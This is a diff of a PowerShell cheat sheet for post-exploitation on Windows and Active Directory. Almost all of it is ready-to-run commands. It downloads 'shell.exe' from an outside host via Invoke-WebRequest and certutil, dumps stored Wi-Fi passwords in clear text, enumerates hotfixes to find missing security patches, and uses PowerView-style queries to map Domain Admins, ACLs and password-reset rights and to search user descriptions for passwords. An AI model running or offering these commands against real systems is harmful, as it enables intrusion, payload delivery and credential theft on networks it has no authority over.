@@ -1,87 +1,82 @@
-        #Powershell handy commands
-        #List of useful Powershell commands
+        # List of useful Powershell commands, default & in context of exploitation.
 
 
-
-     #System enumeration
-
--systeminfo
--Get-WmiObject Win32_ComputerSystem
--echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+>systeminfo
+>Get-WmiObject Win32_ComputerSystem
+>echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
 
 
 
 
       # List Security patches
 
--Get-Hotfix -description "Security update"
--wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn
+>Get-Hotfix -description "Security update"
+>wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn
 
       # Environment Variables
--Get-ChildItem Env: | ft Key,Value
+>Get-ChildItem Env: | ft Key,Value
 
 
-      #(over cmd.exe)
--set
+      # (over cmd.exe)
+>set
 
 
 
-      #HTTP download (wget like)
+      # HTTP download (wget like)
       
--Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" 
+>Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" 
 
 
 
       # Cmd compatible
--certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe
+>certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe
 
 
 
 
-      #WLAN enumeration
-
--netsh wlan show profiles
--netsh wlan show profile name="PROFILE-NAME" key=clear
-
+      # WLAN enumeration
+>netsh wlan show profiles
+>netsh wlan show profile name="PROFILE-NAME" key=clear
 
 
 
 
-    #Active Directory enumeration
+
+    # Active Directory enumeration
 
 
-#Domain enumeration
-Get-NetDomain
+        # Domain enumeration
+>Get-NetDomain
 
 # List Forest Domains
-Get-NetForestDomain
+>Get-NetForestDomain
 
 # Domain SID
-Get-DomainSID 
+>Get-DomainSID 
 
 # Domain Policy
-Get-DomainPolicy
+>Get-DomainPolicy
 
 # Domain Organizational Units
-Get-NetOU
+>Get-NetOU
 
 # List trusted Domains
-Get-NetDomainTrust
+>Get-NetDomainTrust
 
 
-GPO enumeration
+        # GPO enumeration
 
 # GPO applied to the machine
-Get-NetGPO -ComputerName computername.domain.com
+>Get-NetGPO -ComputerName computername.domain.com
 
 
 #Password enumeration
 
 # Last Password Set date
-Get-UserProperty –Properties pwdlastset
+>Get-UserProperty –Properties pwdlastset
 
 # Description of User object
-Find-UserField -SearchField Description –SearchTerm “pass”
+>Find-UserField -SearchField Description –SearchTerm “pass”
 
 
 
@@ -90,13 +85,13 @@ Find-UserField -SearchField Description –SearchTerm “pass”
         Computer enumeration
 
 # List Computers of the Domain
-Get-NetComputer
+>Get-NetComputer
 
 # List Pingable Hosts
-Get-NetComputer -Ping
+>Get-NetComputer -Ping
 
 # List Windows 7 Ultimate Computers
-Get-NetComputer –OperatingSystem "Windows 7 Ultimate"
+>Get-NetComputer –OperatingSystem "Windows 7 Ultimate"
 
 
 
@@ -108,16 +103,16 @@ Get-NetComputer –OperatingSystem "Windows 7 Ultimate"
 
 
 # List Domain Admin members
-Get-NetGroupMember -GroupName "Domain Admins"
+>Get-NetGroupMember -GroupName "Domain Admins"
 
 # List Admin Groups
-Get-NetGroup *admin*
+>Get-NetGroup *admin*
 
 # List Local Admins [need Administrative rights]
-Get-NetLocalGroup –ComputerName PCNAME-001
+>Get-NetLocalGroup –ComputerName PCNAME-001
 
 # Get groups of user [need Administrative rights]
-Get-NetGroup –UserName "username"
+>Get-NetGroup –UserName "username"
 
 
 
@@ -126,11 +121,11 @@ Get-NetGroup –UserName "username"
 
 
 # User ACL
-Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs
+>Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs
 
 # GPO modifications rights
-Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
+>Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
 
 # Password reset rights
-Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"
+>Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"
 
